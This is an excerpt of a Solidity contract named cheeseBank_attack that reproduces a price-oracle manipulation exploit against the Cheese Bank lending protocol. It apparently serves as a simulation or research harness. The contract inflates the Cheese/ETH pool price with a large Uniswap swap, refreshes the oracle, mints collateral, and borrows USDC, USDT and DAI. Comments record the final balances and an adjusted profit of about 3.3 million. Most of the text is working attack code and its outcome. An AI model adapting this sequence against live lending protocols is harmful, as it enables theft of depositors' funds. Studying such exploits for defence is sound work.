...
contract cheeseBank_attack {
    ...
    function attack() public {
        ...
        // action 1 Swap ETH to LP:  ETH --> LP    State: Uniswap
        //           State: Uniswap
        Cheesegot = CheeseToken.balanceOf(address(this));
        ad[0] = WETHAddress;
        ad[1] = CheeseTokenAddress;
        UniswapV2Router02.swapExactETHForTokens{value: 50 * 10 ** 18}(0, ad, address(this), 2000000000);
        ...
        // action 2 SwapETH2Cheese: ETH -> Cheese     State: Uniswap
        //           State: Uniswap
        ad[0] = WETHAddress;
        ad[1] = CheeseTokenAddress;
        UniswapV2Router02.swapExactETHForTokens{value: 20000 ether}(0, ad, address(this), 2000000000); 


        // action 3 refresh: None -> None      State: Uniswap
        //           State: CheeseBank
        ...
        // action 4 LP -> LQ    State: CheesePriceOracle
        //           State: CheeseBank
        cERC20(CheeseETHAddress).mint(2833 * 10 ** 18);



        // action 5  LQ -> USDC     State: Cheese
        //           State: Cheese
        cERC20(CheeseUSDCAddress).borrow(2068252 * 10 ** 6);


        // action 6  LQ -> USDT     State: Cheese
        //           State: Cheese
        cERC20(CheeseUSDTAddress).borrow(1237995 * 10 ** 6);

        // action 7  LQ -> DAI     State: Cheese
        //           State: Cheese        
        cERC20(CheeseDAIAddress).borrow(87586 * 10 ** 18);

        // action 8  Cheese -> ETH     State: Uniswap
        //           State: Uniswap
        cheeseCost = 288822 * 10 ** 18;
        ad[0] = CheeseTokenAddress;
        ad[1] = WETHAddress;
        IUniswapV2Router02(UniswapV2Router02Address).swapExactTokensForETH(cheeseCost, 0, ad, address(this), 2000000000);


        revert(ProfitSummary());

        // ETH balance: 20869
        // USDC balance: 2068252
        // USDT balance: 1237995
        // DAI balance: 87586
        // LP balance: 0
        // Cheese balance: 0
        // Adjusted profit: (20869 - 21000) * 443.2 + 2068252 + 1237995 + 87586 - 107232 * 0.324  = 3301030.632
    ...
    function UniswapExtendedSummary() internal returns (string memory _uintAsString) {
        (reserve0, reserve1, ) = UNI_V2.getReserves();
        uint totalSupply = UNI_V2.totalSupply();
        str80 = appendWithSpace("Cheese balance: ", uint2str(reserve0 / 10 ** 18));
        str81 = appendWithSpace("WETH balance: ", uint2str(reserve1 / 10 ** 18));
        str82 = appendWithSpace("Total supply: ", uint2str(totalSupply / 10 ** 18));
